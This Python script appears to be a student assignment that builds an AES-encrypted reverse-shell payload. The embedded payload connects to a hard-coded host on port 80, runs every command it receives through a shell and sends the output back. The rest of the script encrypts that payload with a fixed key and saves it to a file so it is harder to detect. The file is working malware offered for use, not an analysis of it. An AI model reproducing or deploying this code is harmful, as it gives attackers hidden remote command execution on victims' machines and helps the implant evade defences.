"""
AES Payload Encrypter
Author: Christopher Jones
Assignment: Serious Malware - AES Encrypted Reverse Shell Payload
"""

from Crypto.Cipher import AES
import base64
from pathlib import Path

# AES encryption key
KEY = bytes.fromhex("39c73d5679f7d562bc482d2d1ab24025")
OUTPUT_FILE = Path("encrypted_payload")

# The reverse shell payload to be encrypted
PAYLOAD = b"""
import socket
import subprocess

HOST = "192.168.174.141"
PORT = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    command = s.recv(1024).decode('utf-8')
    if command.lower() == "exit":
        break
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except Exception as e:
        output = str(e).encode()
    s.send(output)
s.close()
"""

def encrypt_payload(key, payload):
    try:
        cipher = AES.new(key, AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(payload)
        return base64.b64encode(nonce + ciphertext + tag)
    except Exception as e:
        raise RuntimeError(f"Failed to encrypt payload: {e}")

def save_to_file(data, file_path):
    try:
        with open(file_path, "wb") as f:
            f.write(data)
    except Exception as e:
        raise RuntimeError(f"Failed to save file '{file_path}': {e}")

def main():
    try:
        encrypted_payload = encrypt_payload(KEY, PAYLOAD)
        save_to_file(encrypted_payload, OUTPUT_FILE)
        print(f"Encrypted payload saved to '{OUTPUT_FILE.resolve()}'")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
